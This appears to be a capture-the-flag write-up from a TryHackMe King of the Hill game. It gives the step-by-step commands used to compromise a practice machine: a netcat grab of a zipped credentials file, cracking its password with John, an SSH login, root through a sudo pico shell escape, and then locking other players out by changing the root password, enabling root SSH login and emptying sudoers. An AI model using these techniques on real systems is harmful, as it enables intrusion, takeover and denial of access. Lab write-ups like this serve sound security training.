#KOTH

## Connect to THM

Cd to Downloads and openvpn Ob.Dog.ovpn

## Recon

Nmap the target

```
PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        vsftpd 3.0.3
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3eae1887b8c335b63aaf0ea4c3a2ef13 (RSA)
|   256 42cffe0dcb9224b98fdc11d410a7a03e (ECDSA)
|_  256 5cfcbcc93a01b1b678ac663c348f222a (ED25519)
80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Wheel of Fortune!
111/tcp   open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      36076/udp   mountd
|   100005  1,2,3      44399/udp6  mountd
|   100005  1,2,3      45799/tcp   mountd
|   100005  1,2,3      46835/tcp6  mountd
|   100021  1,3,4      37216/udp6  nlockmgr
|   100021  1,3,4      45637/tcp6  nlockmgr
|   100021  1,3,4      45887/tcp   nlockmgr
|   100021  1,3,4      52299/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl    3 (RPC #100227)
3333/tcp  open  dec-notes?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, JavaRMI, LPDString, NULL, kumo-server: 
|     UEsDBAoACQAAAIlrw1Y+5stTHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAAPhMXtk4TF7ZHV4CwAB
|     BAAAAAAEAAAAALNS1BAvShGebIr5kWjtkdzNKJj0Xdzl/6Rybgj96vlQSwcIPubLUx8AAAATAAAA
|     UEsBAh4DCgAJAAAAiWvDVj7my1MfAAAAEwAAAAkAGAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVU
|_    BQAD4TF7ZHV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAByAAAAAAA=
9999/tcp  open  http       Werkzeug httpd 1.0.1 (Python 3.6.9)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
40909/tcp open  mountd     1-3 (RPC #100005)
44141/tcp open  mountd     1-3 (RPC #100005)
45799/tcp open  mountd     1-3 (RPC #100005)
45887/tcp open  nlockmgr   1-4 (RPC #100021)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3333-TCP:V=7.93%I=7%D=6/3%Time=647B33B3%P=x86_64-pc-linux-gnu%r(NUL
SF:L,124,"UEsDBAoACQAAAIlrw1Y\+5stTHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAAPhMXt
SF:k4TF7ZHV4CwAB\nBAAAAAAEAAAAALNS1BAvShGebIr5kWjtkdzNKJj0Xdzl/6Rybgj96vlQ
SF:SwcIPubLUx8AAAATAAAA\nUEsBAh4DCgAJAAAAiWvDVj7my1MfAAAAEwAAAAkAGAAAAAAAA
SF:QAAAKSBAAAAAGNyZWRzLnR4dFVU\nBQAD4TF7ZHV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQ
SF:ABAE8AAAByAAAAAAA=\n")%r(GenericLines,124,"UEsDBAoACQAAAIlrw1Y\+5stTHwA
SF:AABMAAAAJABwAY3JlZHMudHh0VVQJAAPhMXtk4TF7ZHV4CwAB\nBAAAAAAEAAAAALNS1BAv
SF:ShGebIr5kWjtkdzNKJj0Xdzl/6Rybgj96vlQSwcIPubLUx8AAAATAAAA\nUEsBAh4DCgAJA
SF:AAAiWvDVj7my1MfAAAAEwAAAAkAGAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVU\nBQAD4T
SF:F7ZHV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAByAAAAAAA=\n")%r(LPDString,
SF:124,"UEsDBAoACQAAAIlrw1Y\+5stTHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAAPhMXtk4
SF:TF7ZHV4CwAB\nBAAAAAAEAAAAALNS1BAvShGebIr5kWjtkdzNKJj0Xdzl/6Rybgj96vlQSw
SF:cIPubLUx8AAAATAAAA\nUEsBAh4DCgAJAAAAiWvDVj7my1MfAAAAEwAAAAkAGAAAAAAAAQA
SF:AAKSBAAAAAGNyZWRzLnR4dFVU\nBQAD4TF7ZHV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQAB
SF:AE8AAAByAAAAAAA=\n")%r(JavaRMI,124,"UEsDBAoACQAAAIlrw1Y\+5stTHwAAABMAAA
SF:AJABwAY3JlZHMudHh0VVQJAAPhMXtk4TF7ZHV4CwAB\nBAAAAAAEAAAAALNS1BAvShGebIr
SF:5kWjtkdzNKJj0Xdzl/6Rybgj96vlQSwcIPubLUx8AAAATAAAA\nUEsBAh4DCgAJAAAAiWvD
SF:Vj7my1MfAAAAEwAAAAkAGAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVU\nBQAD4TF7ZHV4C
SF:wABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAByAAAAAAA=\n")%r(kumo-server,124,"
SF:UEsDBAoACQAAAIlrw1Y\+5stTHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAAPhMXtk4TF7ZH
SF:V4CwAB\nBAAAAAAEAAAAALNS1BAvShGebIr5kWjtkdzNKJj0Xdzl/6Rybgj96vlQSwcIPub
SF:LUx8AAAATAAAA\nUEsBAh4DCgAJAAAAiWvDVj7my1MfAAAAEwAAAAkAGAAAAAAAAQAAAKSB
SF:AAAAAGNyZWRzLnR4dFVU\nBQAD4TF7ZHV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AA
SF:AByAAAAAAA=\n")%r(GetRequest,124,"UEsDBAoACQAAAIlrw1Y\+5stTHwAAABMAAAAJ
SF:ABwAY3JlZHMudHh0VVQJAAPhMXtk4TF7ZHV4CwAB\nBAAAAAAEAAAAALNS1BAvShGebIr5k
SF:WjtkdzNKJj0Xdzl/6Rybgj96vlQSwcIPubLUx8AAAATAAAA\nUEsBAh4DCgAJAAAAiWvDVj
SF:7my1MfAAAAEwAAAAkAGAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVU\nBQAD4TF7ZHV4CwA
SF:BBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAByAAAAAAA=\n")%r(HTTPOptions,124,"UE
SF:sDBAoACQAAAIlrw1Y\+5stTHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAAPhMXtk4TF7ZHV4
SF:CwAB\nBAAAAAAEAAAAALNS1BAvShGebIr5kWjtkdzNKJj0Xdzl/6Rybgj96vlQSwcIPubLU
SF:x8AAAATAAAA\nUEsBAh4DCgAJAAAAiWvDVj7my1MfAAAAEwAAAAkAGAAAAAAAAQAAAKSBAA
SF:AAAGNyZWRzLnR4dFVU\nBQAD4TF7ZHV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAB
SF:yAAAAAAA=\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```


I see this on port 3333
```
3333/tcp  open  dec-notes?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, JavaRMI, LPDString, NULL, kumo-server: 
|     UEsDBAoACQAAAIlrw1Y+5stTHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAAPhMXtk4TF7ZHV4CwAB
|     BAAAAAAEAAAAALNS1BAvShGebIr5kWjtkdzNKJj0Xdzl/6Rybgj96vlQSwcIPubLUx8AAAATAAAA
|     UEsBAh4DCgAJAAAAiWvDVj7my1MfAAAAEwAAAAkAGAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVU
|_    BQAD4TF7ZHV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAByAAAAAAA=
```

I use netcat to see the other side
`nc [ip] 33333 | base64 -d`
and I get this
```
PK
        �k�V>��S        creds.txtUT     �1{d�1{dux
                                                  �R�/J�l���h����(��]����r���P>��SPK
        �k�V>��S        ▒��creds.txtUT�1{dux
                                            PKOr  
```

I put it in a file with
`nc [ip] 33333 | base64 -d > test.zip`
I try to unzip but needs password
So I use zip2john
`zip2john test.zip > hash.txt`
Then I crack hash with John
`john hash.txt`
and find _losers_ as password. So I unzip the test.zip with losers as password
I get a creds.txt , I cat it and find
`fortuna:MjBkOTVmN2`
So I ssh on the machine with those creds and get in

## Attack
I am on the machine as fortuna
I type `sudo -l` and get
```
Matching Defaults entries for fortuna on fortune:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fortuna may run the following commands on fortune:
    (ALL : ALL) /usr/bin/pico

```

So I search online something for pico and go to gtfo
```
sudo pico
^R^X
reset; sh 1>&0 2>&0
```

And now I am root!

## Deny access

I type passwd and enter a new password that I only know.
Then I open `/etc/ssh/sshd_config`
Scroll to `#PermitRootLogin prohibit-password` and change it to
`PermitRootLogin yes` , save and exit
Then I type `service sshd restart`

I exit this instance and I ssh as root with my new password!
I open `/etc/sudoers`, scroll to `#includedir /etc/sudoers.d` 
and delete everyone under it, and save.


## Fun
I write my name on `/root/king.txt` and save. I am the king now!
To find flags I type
`find / -name flag 2> /dev/null`
And find them all